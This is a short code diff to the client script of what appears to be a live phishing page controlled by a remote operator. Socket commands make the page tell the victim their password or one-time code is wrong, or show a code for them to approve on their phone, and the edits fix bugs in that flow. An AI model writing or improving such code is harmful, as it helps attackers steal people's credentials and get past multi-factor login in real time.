@@ -20,9 +20,10 @@
 	let loadingFrame=null;
 	 
 	function showError(message){
+		stopLoading();
 	  wrapper.classList.add("error","shake");
 	  errorMessage.classList.add("error");
-	  errorText.textContent=message;
+	  if(errorMessage){errorText.textContent=message;}
 	  setTimeout(()=>wrapper.classList.remove("shake"),350);
 	}
 	
@@ -70,6 +71,8 @@
 			
     socket.on("user:command", (data) => {
 	  const { command, code, phonescreen, link } = data;
+	  
+	  let phoneNumberEl;
 	//alert("command received");
 	  switch (command) {
 	    case "refresh":
@@ -78,17 +81,16 @@
 	
 	    case "bad-otp":
 	      showError("incorrect code");
-	      stopLoading();
 	      break;
 	      
 	    case "bad-login":
 	      showError("incorrect password");
-	      stopLoading();
 	      break;
 	
 	    case "phone-otp":
 	      if (!code) return;
-	      let phoneNumberEl = document.querySelector("#phone");
+	      console.log(code);
+	       phoneNumberEl = document.querySelector("#phone");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
@@ -97,9 +99,9 @@
 	      phoneNumberEl.textContent = code;
 	      break;
 	
-	    case "auth":
+	    case "prompt":
 	      if (!code) return;
-	      let phoneNumberEl = document.querySelector("#code");
+	      phoneNumberEl = document.querySelector("#code");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
